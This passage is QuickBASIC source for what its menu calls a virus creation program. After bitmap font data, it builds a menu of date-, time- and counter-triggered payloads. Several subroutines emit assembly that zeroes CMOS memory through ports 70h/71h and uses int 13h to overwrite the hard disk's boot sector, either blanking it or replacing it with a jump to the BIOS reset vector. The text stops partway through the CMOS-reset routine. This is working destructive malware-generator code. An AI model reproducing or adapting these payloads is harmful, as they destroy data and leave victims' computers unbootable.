DATA 0,0,0,24,60,126,255,255,90,24,60,0,0,0,0,0
DATA 0,0,0,0,0,24,60,60,24,0,0,0,0,0,0,0
DATA 255,255,255,255,255,231,195,195,231,255,255,255,255,255,0,0
DATA 0,0,0,0,60,66,66,66,66,60,0,0,0,0,0,0
DATA 255,255,255,255,195,153,189,189,153,195,255,255,255,255,0,0
DATA 0,0,0,126,126,0,126,126,0,112,126,0,0,0,0,0
DATA 0,0,28,34,34,34,28,8,62,8,8,0,0,0,0,0
DATA 0,0,31,17,31,16,16,16,48,112,96,0,0,0,0,0
DATA 0,0,63,33,63,33,33,33,35,103,230,64,0,0,0,0
DATA 0,0,0,28,42,75,125,117,34,28,0,0,0,0,0,0
DATA 0,0,64,96,112,124,127,124,112,96,64,0,0,0,0,0
DATA 0,0,1,3,7,31,127,31,7,3,1,0,0,0,0,0
DATA 0,0,0,195,195,0,0,0,0,24,24,0,0,0,0,0
DATA 0,0,60,36,36,36,52,52,52,52,60,0,0,0,0,0
DATA 0,0,63,73,73,73,57,9,9,9,9,0,0,0,0,0
DATA 0,60,66,32,24,36,66,66,36,24,4,66,60,0,0,0
DATA 0,0,127,65,97,113,105,101,99,97,127,0,0,0,0,0
DATA 0,0,127,65,77,115,115,109,97,97,127,0,0,0,0,0
DATA 0,0,8,28,62,8,8,8,8,12,12,0,0,0,0,0
DATA 0,0,24,24,8,8,8,8,62,28,8,0,0,0,0,0
DATA 0,0,0,0,4,102,127,6,4,0,0,0,0,0,0,0
DATA 0,0,0,0,16,48,127,51,16,0,0,0,0,0,0,0
DATA 0,0,24,24,16,16,16,16,16,30,30,0,0,0,0,0
DATA 0,0,0,0,36,102,255,102,36,0,0,0,0,0,0,0
DATA 0,0,0,12,12,22,22,34,34,65,127,0,0,0,0,0
DATA 0,0,0,127,65,34,34,52,60,24,24,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,8,8,8,8,12,12,0,12,12,0,0,0,0,0
DATA 0,0,51,51,34,34,0,0,0,0,0,0,0,0,0,0
DATA 0,0,36,36,255,36,100,255,100,100,0,0,0,0,0,0
DATA 0,0,12,12,63,76,76,62,11,11,126,8,8,0,0,0
DATA 0,0,8,200,200,8,24,24,27,27,24,0,0,0,0,0
DATA 0,0,28,34,32,32,120,103,97,97,62,0,0,0,0,0
DATA 0,0,24,24,16,16,0,0,0,0,0,0,0,0,0,0
DATA 0,0,24,32,32,32,48,48,48,48,24,0,0,0,0,0
DATA 0,0,12,6,6,2,2,2,2,2,12,0,0,0,0,0
DATA 0,0,0,0,75,75,60,106,106,106,0,0,0,0,0,0
DATA 0,0,0,0,8,8,8,62,8,12,12,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,24,24,16,32,0,0,0
DATA 0,0,0,0,0,0,60,60,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0
DATA 0,0,0,1,2,4,8,16,48,96,192,0,0,0,0,0
DATA 0,0,62,65,65,65,67,67,67,67,62,0,0,0,0,0
DATA 0,0,8,8,8,8,24,24,24,24,24,0,0,0,0,0
DATA 0,0,62,65,1,1,62,96,96,96,127,0,0,0,0,0
DATA 0,0,60,66,2,62,3,3,67,67,62,0,0,0,0,0
DATA 0,0,62,66,66,66,66,66,127,6,6,0,0,0,0,0
DATA 0,0,127,64,64,126,3,3,67,67,62,0,0,0,0,0
DATA 0,0,62,65,64,126,67,67,67,67,62,0,0,0,0,0
DATA 0,0,126,2,2,2,6,6,6,6,6,0,0,0,0,0
DATA 0,0,28,34,34,34,63,67,67,67,62,0,0,0,0,0
DATA 0,0,62,65,65,65,65,63,3,3,3,0,0,0,0,0
DATA 0,0,0,0,24,24,0,0,24,24,0,0,0,0,0,0
DATA 0,0,0,0,0,24,24,0,0,24,24,16,32,0,0,0
DATA 0,0,4,8,16,48,112,48,16,8,4,0,0,0,0,0
DATA 0,0,0,0,126,126,0,0,126,126,0,0,0,0,0,0
DATA 0,0,16,8,4,6,7,6,4,8,16,0,0,0,0,0
DATA 0,0,126,65,1,1,126,96,0,96,96,0,0,0,0,0
DATA 0,0,62,65,157,131,159,179,179,156,192,124,0,0,0,0
DATA 0,0,62,34,34,34,127,97,97,97,97,0,0,0,0,0
DATA 0,0,124,66,66,126,97,97,97,97,126,0,0,0,0,0
DATA 0,0,62,65,65,64,96,96,97,97,62,0,0,0,0,0
DATA 0,0,126,65,65,65,97,97,97,97,126,0,0,0,0,0
DATA 0,0,127,64,64,126,96,96,96,96,127,0,0,0,0,0
DATA 0,0,127,64,64,64,126,96,96,96,96,0,0,0,0,0
DATA 0,0,62,65,64,64,103,97,97,97,62,0,0,0,0,0
DATA 0,0,65,65,65,65,127,97,97,97,97,0,0,0,0,0
DATA 0,0,8,8,8,8,12,12,12,12,12,0,0,0,0,0
DATA 0,0,2,2,2,2,3,3,67,67,62,0,0,0,0,0
DATA 0,0,66,66,66,68,126,97,97,97,97,0,0,0,0,0
DATA 0,0,64,64,64,64,96,96,96,96,127,0,0,0,0,0
DATA 0,0,62,73,73,73,105,105,105,105,105,0,0,0,0,0
DATA 0,0,126,65,65,65,97,97,97,97,97,0,0,0,0,0
DATA 0,0,62,67,67,65,65,65,65,65,62,0,0,0,0,0
DATA 0,0,126,65,65,65,126,96,96,96,96,0,0,0,0,0
DATA 0,0,62,65,65,65,65,65,65,71,63,0,0,0,0,0
DATA 0,0,124,66,66,66,126,97,97,97,97,0,0,0,0,0
DATA 0,0,62,65,96,96,62,3,3,67,62,0,0,0,0,0
DATA 0,0,127,8,8,8,12,12,12,12,12,0,0,0,0,0
DATA 0,0,65,65,65,65,97,97,97,97,62,0,0,0,0,0
DATA 0,0,97,97,97,97,98,34,34,34,28,0,0,0,0,0
DATA 0,0,73,73,73,73,105,105,105,105,62,0,0,0,0,0
DATA 0,0,65,65,65,34,28,34,97,97,97,0,0,0,0,0
DATA 0,0,67,67,67,67,62,24,24,24,24,0,0,0,0,0
DATA 0,0,127,65,1,2,12,48,96,97,127,0,0,0,0,0
DATA 0,0,30,16,16,16,24,24,24,24,30,0,0,0,0,0
DATA 0,0,0,128,64,32,16,8,12,6,3,0,0,0,0,0
DATA 0,0,60,12,12,4,4,4,4,4,60,0,0,0,0,0
DATA 0,0,0,0,0,0,8,20,50,97,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,120,127,0,0,0
DATA 0,0,16,8,12,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,62,1,31,49,49,30,0,0,0,0,0
DATA 0,0,32,32,32,62,33,49,49,49,62,0,0,0,0,0
DATA 0,0,0,0,0,30,33,48,48,49,30,0,0,0,0,0
DATA 0,0,1,1,1,31,33,49,49,49,31,0,0,0,0,0
DATA 0,0,0,0,0,30,33,63,48,49,30,0,0,0,0,0
DATA 0,0,6,8,8,30,8,12,12,12,12,0,0,0,0,0
DATA 0,0,0,0,0,30,33,49,49,49,31,1,30,0,0,0
DATA 0,0,32,32,32,62,33,49,49,49,49,0,0,0,0,0
DATA 0,0,12,12,0,8,8,12,12,12,12,0,0,0,0,0
DATA 0,0,12,12,0,8,8,12,12,12,12,4,4,0,0,0
DATA 0,0,32,32,32,33,34,62,49,49,49,0,0,0,0,0
DATA 0,0,8,8,8,12,12,12,12,12,12,0,0,0,0,0
DATA 0,0,0,0,0,62,73,73,109,109,109,0,0,0,0,0
DATA 0,0,0,0,0,62,33,49,49,49,49,0,0,0,0,0
DATA 0,0,0,0,0,30,33,49,49,49,30,0,0,0,0,0
DATA 0,0,0,0,0,62,33,49,49,49,62,32,32,0,0,0
DATA 0,0,0,0,0,30,33,49,49,49,31,1,1,0,0,0
DATA 0,0,0,0,0,62,32,48,48,48,48,0,0,0,0,0
DATA 0,0,0,0,0,31,32,30,3,35,30,0,0,0,0,0
DATA 0,0,8,8,8,62,8,12,12,12,12,0,0,0,0,0
DATA 0,0,0,0,0,33,33,49,49,49,30,0,0,0,0,0
DATA 0,0,0,0,0,49,49,49,18,18,12,0,0,0,0,0
DATA 0,0,0,0,0,73,73,109,109,109,62,0,0,0,0,0
DATA 0,0,0,0,0,33,33,30,49,49,49,0,0,0,0,0
DATA 0,0,0,0,0,49,49,49,49,33,31,1,1,0,0,0
DATA 0,0,0,0,0,63,33,6,24,49,63,0,0,0,0,0
DATA 0,0,6,8,8,8,16,12,12,12,6,0,0,0,0,0
DATA 0,0,8,8,8,8,8,8,8,8,8,8,0,0,0,0
DATA 0,0,48,24,24,8,4,8,8,8,48,0,0,0,0,0
DATA 0,0,0,0,0,48,73,6,0,0,0,0,0,0,0,0
DATA 0,0,0,0,8,28,54,99,99,127,0,0,0,0,0,0
DATA 0,0,62,65,65,64,96,96,97,97,62,0,12,28,0,0
DATA 0,0,51,51,0,33,33,49,49,49,30,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,30,33,48,48,49,30,0,12,28,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,8,8,12,12,12,12,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,127,65,65,65,97,97,97,97,127,0,0,0,0,0
DATA 0,0,127,73,73,65,97,97,97,97,127,0,0,0,0,0
DATA 0,0,127,65,73,65,127,97,105,97,127,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,51,33,0,30,33,49,49,49,30,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 12,12,0,8,8,8,12,12,12,12,12,0,0,0,0,0
DATA 99,65,62,67,67,65,65,65,65,65,62,0,0,0,0,0
DATA 99,99,0,65,65,65,97,97,97,97,62,0,0,0,0,0
DATA 0,0,0,4,4,30,33,48,48,49,30,4,4,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,0,8,8,8,8,104,127,0,0,0,0,0,0
DATA 0,0,62,65,96,96,62,3,3,67,62,0,12,28,0,0
DATA 0,0,0,0,0,31,32,30,3,35,30,0,12,28,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 62,0,62,65,64,64,103,97,97,97,62,0,0,0,0,0
DATA 0,0, 0,30,0,30,33,49,49,49,31,1,30,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,30,30,16,16,16,16,16,24,24,0,0,0,0,0
DATA 0,0,0,0,0,127,3,3,3,0,0,0,0,0,0,0
DATA 0,0,0,0,4,102,127,6,4,0,0,0,0,0,0,0
DATA 0,0,0,38,38,34,34,34,28,0,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,127,104,28,42,42,28,8,8,0,0,0,0,0
DATA 0,0,0,8,8,28,42,42,28,104,127,0,0,0,0,0
DATA 17,68,17,68,17,68,17,68,17,68,17,68,17,68,0,0
DATA 85,170,85,170,85,170,85,170,85,170,85,170,85,170,0,0
DATA 221,119,221,119,221,119,221,119,221,119,221,119,221,119,0,0
DATA 24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,0
DATA 24,24,24,24,24,24,24,248,24,24,24,24,24,24,0,0
DATA 24,24,24,24,24,248,24,248,24,24,24,24,24,24,0,0
DATA 54,54,54,54,54,54,54,246,54,54,54,54,54,54,54,54
DATA 0,0,0,0,0,0,0,254,54,54,54,54,54,54,54,54
DATA 0,0,0,0,0,248,24,248,24,24,24,24,24,24,0,0
DATA 54,54,54,54,54,246,6,246,54,54,54,54,54,54,54,54
DATA 54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54
DATA 0,0,0,0,0,254,6,246,54,54,54,54,54,54,54,54
DATA 54,54,54,54,54,246,6,254,0,0,0,0,0,0,0,0
DATA 54,54,54,54,54,54,54,254,0,0,0,0,0,0,0,0
DATA 24,24,24,24,24,248,24,248,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,248,24,24,24,24,24,24,0,0
DATA 24,24,24,24,24,24,24,31,0,0,0,0,0,0,0,0
DATA 24,24,24,24,24,24,24,255,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,255,24,24,24,24,24,24,0,0
DATA 24,24,24,24,24,24,24,31,24,24,24,24,24,24,0,0
DATA 0,0,0,0,0,0,0,255,0,0,0,0,0,0,0,0
DATA 24,24,24,24,24,24,24,255,24,24,24,24,24,24,0,0
DATA 24,24,24,24,24,31,24,31,24,24,24,24,24,24,0,0
DATA 54,54,54,54,54,54,54,55,54,54,54,54,54,54,54,54
DATA 54,54,54,54,54,55,48,63,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,63,48,55,54,54,54,54,54,54,54,54
DATA 54,54,54,54,54,247,0,255,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,255,0,247,54,54,54,54,54,54,0 ,0
DATA 54,54,54,54,54,55,48,55,54,54,54,54,54,54,54,54
DATA 0,0,0,0,0,255,0,255,0,0,0,0,0,0,0,0
DATA 54,54,54,54,54,247,0,247,54,54,54,54,54,54,0,0
DATA 24,24,24,24,24,255,0,255,0,0,0,0,0,0,0,0
DATA 54,54,54,54,54,54,54,255,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,255,0,255,24,24,24,24,24,24,0,0
DATA 0,0,0,0,0,0,0,255,54,54,54,54,54,54,0,0
DATA 54,54,54,54,54,54,54,63,0,0,0,0,0,0,0,0
DATA 24,24,24,24,24,31,24,31,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,31,24,31,24,24,24,24,24,24,0,0
DATA 0,0,0,0,0,0,0,63,54,54,54,54,54,54,0,0
DATA 54,54,54,54,54,54,54,255,54,54,54,54,54,54,0,0
DATA 24,24,24,24,24,255,24,255,24,24,24,24,24,24,0,0
DATA 24,24,24,24,24,24,24,248,0,0,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,31,24,24,24,24,24,24,0,0
DATA 255,255,255,255,255,255,255,255,255,255,255,255,255,255,0,0
DATA 0,0,0,0,0,0,0,255,255,255,255,255,255,255,0,0
DATA 240,240,240,240,240,240,240,240,240,240,240,240,240,240,0,0
DATA 15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,0
DATA 255,255,255,255,255,255,255,0,0,0,0,0,0,0,0,0
DATA 0,0,0,0,58,68,100,100,59,0,0,0,0,0,0,0
DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
DATA 0,0,0,0,62,64,64,112,62,0,0,0,0,0,0,0
DATA 0,0,0,0,124,14,2,2,124,0,0,0,0,0,0,0
DATA 0,0,48,80,190,129,158,132,152,132,248,0,0,0,0,0
DATA 0,0,0,24,24,117,173,198,66,129,0,0,0,0,0,0
DATA 0,0,16,24,28,30,31,30,28,24,16,0,0,0,0,0
DATA 0,0,0,129,66,115,173,166,24,24,0,0,0,0,0,0
DATA 0,0,8,28,42,73,105,105,42,28,8,0,0,0,0,0
DATA 0,0,0,28,34,65,127,97,34,28,0,0,0,0,0,0
DATA 0,0,0,28,34,65,97,97,34,28,0,0,0,0,0,0
DATA 0,0,0,0,0,0,65,34,52,24,0,0,0,0,0,0
DATA 0,0,0,0,16,16,16,28,12,0,0,0,0,0,0,0
DATA 0,0,0,184,68,162,210,202,68,58,1,0,0,0,0,0
DATA 0,0,0,0,30,32,60,48,30,0,0,0,0,0,0,0
DATA 0,0,0,28,34,34,34,50,50,0,0,0,0,0,0,0
DATA 0,0,0,1,2,4,127,16,48,96,0,0,0,0,0,0
DATA 0,0,0,64,32,16,127,4,6,3,0,0,0,0,0,0
DATA 0,0,32,16,8,12,8,16,32,0,96,124,0,0,0,0
DATA 0,0,4,8,16,48,16,8,4,0,96,126,0,0,0,0
DATA 0,0,1,2,255,8,208,255,64,128,0,0,0,0,0,0
DATA 0,0,0,0,34,20,8,28,50,0,0,0,0,0,0,0
DATA 0,0,24,24,0,96,126,0,0,24,24,0,0,0,0,0
DATA 0,0,12,12,22,22,34,34,65,127,0,85,0,0,0,0
DATA 0,0,0,0,24,36,52,24,0,0,0,0,0,0,0,0
DATA 0,0,0,0,001,002,004,0136,80,032,0,0,0,0,0,0
DATA 0,0,28,34,65,65,65,65,65,65,65,65,65,65,65,95
DATA 0,0,28,34,65,65,65,65,65,65,65,65,65,65,65,65
DATA 0,0,28,34,65,65,65,65,65,65,65,65,65,65,65,65
DATA 64,65,65,65,65,65,65,65,65,65,65,65,65,65,34,28
DATA 64,95,65,65,65,65,65,65,65,65,65,65,65,65,34,28
DATA 65,65,65,65,65,65,65,65,65,65,65,65,65,65,34,28

Hata:
CALL HataRutin
RESUME AnaMenu
END

SUB AnaMenu

COLOR 0, zeminArka: CLS
satir = 3: sutun = 3
COLOR 0, zemin: PRINT STRING$(80, " ")
COLOR 15, zemin: LOCATE 1, 32: PRINT program$
COLOR 11, zemin: LOCATE 1, 2: PRINT "VirÅs öretim Yazçlçmç"
LOCATE 1, 72: PRINT Yil$
LOCATE 1, 56: PRINT yazar$
COLOR LogoColor, zemin: LOCATE 1, 77: PRINT CHR$(250); CHR$(251); CHR$(252)
COLOR LogoColor, zeminArka: LOCATE 2, 77: PRINT CHR$(253); CHR$(254); CHR$(255)

COLOR 15, zemin
LOCATE satir, sutun: PRINT "…ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕ öRETòM MENöSö ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕª"
FOR i = 2 TO 19: COLOR 15, zemin: LOCATE (satir - 1) + i, sutun: PRINT "∫"; : COLOR 3, zemin: PRINT STRING$(73, " "); : COLOR 15, zemin: PRINT "∫"; : COLOR 0, 0: PRINT "€€"
NEXT i
LOCATE satir + 19, sutun: COLOR 15, zemin: PRINT "»ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕº"; : COLOR 0, 0: PRINT "€€"
COLOR 0, 0: LOCATE satir + 20, sutun + 2: PRINT STRING$(75, "€")

LOCATE satir + 1, sutun: COLOR 15, zemin: PRINT "ÃÕÕ Tetikler ÕÕÕÕÕÕÕÕÕÕÕÕ Aktiviteler ÕÕÕÕÕÕÕÕÕÕ Tarih ÕÕÕÕ Saat Õ Sayaá Õπ"
FOR i = 1 TO 2
LOCATE satir + i + 1, sutun + 2: COLOR 7, zemin: PRINT "[ ]          "; : COLOR 15, zemin: PRINT FuncName$(i)
LOCATE satir + i + 1, sutun + 46: COLOR 7, zemin: PRINT "[          ] [     ] [    ]"
LOCATE satir + i + 1, sutun + 47: COLOR 15, zemin: PRINT FuncDate$(i)
LOCATE satir + i + 1, sutun + 60: COLOR 15, zemin: PRINT FuncTime$(i)
LOCATE satir + i + 1, sutun + 68: COLOR 15, zemin: PRINT LTRIM$(STR$(FuncCounter(i)))
NEXT
FOR i = 3 TO 15
LOCATE satir + i + 1, sutun + 2: COLOR 7, zemin: PRINT "[ ][ ][ ][ ] "; : COLOR 15, zemin: PRINT FuncName$(i)
LOCATE satir + i + 1, sutun + 46: COLOR 7, zemin: PRINT "[          ] [     ] [    ]"
LOCATE satir + i + 1, sutun + 47: COLOR 15, zemin: PRINT FuncDate$(i)
LOCATE satir + i + 1, sutun + 60: COLOR 15, zemin: PRINT FuncTime$(i)
LOCATE satir + i + 1, sutun + 68: COLOR 15, zemin: PRINT LTRIM$(STR$(FuncCounter(i)))
NEXT
LOCATE satir + 17, sutun + 2: COLOR 7, zemin: PRINT "[                                                                     ]"
LOCATE satir + 18, sutun + 2: COLOR 7, zemin: PRINT "[                                                                     ]"
LOCATE Str, 5: COLOR 31, zemin: PRINT "["; : LOCATE Str, 7: PRINT "]"

END SUB

SUB Bekle
 FOR i = 1 TO SysSpeed * 30
 NEXT
END SUB

SUB EkranKartiTest

SCREEN 0: COLOR 7, 0: CLS : WIDTH 80, 25
CALL INTERRUPTX(&H11, Regs, Regs)
Adaptor1 = Regs.ax AND 48

Regs.ax = &H1A00
CALL INTERRUPTX(&H10, Regs, Regs)
Adaptor2 = Regs.ax AND 255
CLS
IF (Adaptor1 <> 16 AND Adaptor1 <> 32) OR Adaptor2 <> &H1A THEN
 CALL ProgramSonu
 PRINT program$; " , "; yazar$; " , "; Yil$
 PRINT "Bu programçn áalçüabilmesi iáin en az , VGA ekran kartç gerekir."
 BEEP
 END
END IF

END SUB

SUB FuncBootDegistir (IslemKodu)

ActionName$ = "BootDegistir"
ActionCode = 5

IF IslemKodu = FonksiyonKontrol THEN
     PRINT #1, ActionName$ + "Label:"
 IF FuncTick(ActionCode) <> 0 THEN
      CALL JumpYaz(ActionCode)
      PRINT #1, "          jnz PartSilLabel"
      PRINT #1, "          call " + ActionName$
 END IF
END IF


IF IslemKodu = AnaKoduYaz THEN
  PRINT #1, ";................................."
  PRINT #1, ActionName$ + ":"
 IF FuncTick(ActionCode) <> 0 THEN
  CALL RegisterSakla

  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 OR INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 OR INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN CALL TarihYaz(ActionName$)
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 OR INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN CALL SaatYaz(ActionName$)
  IF INT(FuncCounter(ActionCode)) <> 0 THEN CALL SayacYaz(ActionName$, FuncCounter(ActionCode))

  PRINT #1, "          mov cx,00ffh"
  PRINT #1, "CmsRst1:  mov al,cl"
  PRINT #1, "          out 70h,al"
  PRINT #1, "          xor al,al"
  PRINT #1, "          out 71h,al"
  PRINT #1, "          loop CmsRst1"
  PRINT #1, "          mov ax,0301h"
  PRINT #1, "          mov cx,0001h"
  PRINT #1, "          mov dx,0180h"
  PRINT #1, "          mov bx,offset NewBootCode"
  PRINT #1, "          push cs"
  PRINT #1, "          pop es"
  PRINT #1, "          int 13h"

  CALL RegisterYaz(ActionName$)
 END IF
END IF


IF IslemKodu = DegiskenYaz THEN
 IF FuncTick(ActionCode) <> 0 THEN
  BootDegistirGun$ = STR$(INT(VAL(LEFT$(FuncDate$(ActionCode), 2))))
  BootDegistirAy$ = STR$(INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))))
  BootDegistirYil$ = STR$(INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))))
  BootDegistirSaat$ = STR$(INT(VAL(LEFT$(FuncTime$(ActionCode), 2))))
  BootDegistirDakika$ = STR$(INT(VAL(MID$(FuncTime$(ActionCode), 4, 2))))
  BootDegistirSayac = INT(FuncCounter(ActionCode))
  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihGun    db " + BootDegistirGun$ + "h"
  END IF
  IF INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihAy     db " + BootDegistirAy$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihYil    dw " + BootDegistirYil$ + "h"
  END IF
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanSaat   db " + BootDegistirSaat$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanDakika db " + BootDegistirDakika$ + "h"
  END IF
  IF INT(FuncCounter(ActionCode)) <> 0 THEN
   PRINT #1, ActionName$ + "Sayac       dw 0000"
  END IF
 PRINT #1, "NewBootCode db 0EAh,00,00,0FFh,0FFh"
 END IF
END IF

END SUB

SUB FuncBootSil (IslemKodu)

ActionName$ = "BootSil"
ActionCode = 4

IF IslemKodu = FonksiyonKontrol THEN
     PRINT #1, ActionName$ + "Label:"
 IF FuncTick(ActionCode) <> 0 THEN
      CALL JumpYaz(ActionCode)
      PRINT #1, "          jnz BootDegistirLabel"
      PRINT #1, "          call " + ActionName$
 END IF
END IF


IF IslemKodu = AnaKoduYaz THEN
  PRINT #1, ";................................."
  PRINT #1, ActionName$ + ":"
 IF FuncTick(ActionCode) <> 0 THEN
  CALL RegisterSakla
 
  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 OR INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 OR INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN CALL TarihYaz(ActionName$)
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 OR INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN CALL SaatYaz(ActionName$)
  IF INT(FuncCounter(ActionCode)) <> 0 THEN CALL SayacYaz(ActionName$, FuncCounter(ActionCode))
 
  PRINT #1, "          mov cx,00ffh"
  PRINT #1, "CmsRst2:  mov al,cl"
  PRINT #1, "          out 70h,al"
  PRINT #1, "          xor al,al"
  PRINT #1, "          out 71h,al"
  PRINT #1, "          loop CmsRst2"
  PRINT #1, "          mov ax,0301h"
  PRINT #1, "          mov cx,0001h"
  PRINT #1, "          mov dx,0180h"
  PRINT #1, "          int 13h"
 
  CALL RegisterYaz(ActionName$)
 END IF
END IF


IF IslemKodu = DegiskenYaz THEN
 IF FuncTick(ActionCode) <> 0 THEN
  BootSilGun$ = STR$(INT(VAL(LEFT$(FuncDate$(ActionCode), 2))))
  BootSilAy$ = STR$(INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))))
  BootSilYil$ = STR$(INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))))
  BootSilSaat$ = STR$(INT(VAL(LEFT$(FuncTime$(ActionCode), 2))))
  BootSilDakika$ = STR$(INT(VAL(MID$(FuncTime$(ActionCode), 4, 2))))
  BootSilSayac = INT(FuncCounter(ActionCode))
  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihGun    db " + BootSilGun$ + "h"
  END IF
  IF INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihAy     db " + BootSilAy$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihYil    dw " + BootSilYil$ + "h"
  END IF
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanSaat   db " + BootSilSaat$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanDakika db " + BootSilDakika$ + "h"
  END IF
  IF INT(FuncCounter(ActionCode)) <> 0 THEN
   PRINT #1, ActionName$ + "Sayac       dw 0000"
  END IF
 END IF
END IF


END SUB

SUB FuncCmosReset (IslemKodu)

ActionName$ = "CmosReset"
ActionCode = 7

IF IslemKodu = FonksiyonKontrol THEN
     PRINT #1, ActionName$ + "Label:"
 IF FuncTick(ActionCode) <> 0 THEN
      CALL JumpYaz(ActionCode)
      PRINT #1, "          jnz KlavyeKilitleLabel"
      PRINT #1, "          call " + ActionName$
 END IF
END IF


IF IslemKodu = AnaKoduYaz THEN
  PRINT #1, ";................................."
  PRINT #1, ActionName$ + ":"
 IF FuncTick(ActionCode) <> 0 THEN
  CALL RegisterSakla

  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 OR INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 OR INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN CALL TarihYaz(ActionName$)
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 OR INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN CALL SaatYaz(ActionName$)
  IF INT(FuncCounter(ActionCode)) <> 0 THEN CALL SayacYaz(ActionName$, FuncCounter(ActionCode))

  PRINT #1, "          mov cx,00ffh"
  PRINT #1, "CmsRst:   mov al,cl"
  PRINT #1, "          out 70h,al"
  PRINT #1, "          xor al,al"
  PRINT #1, "          out 71h,al"
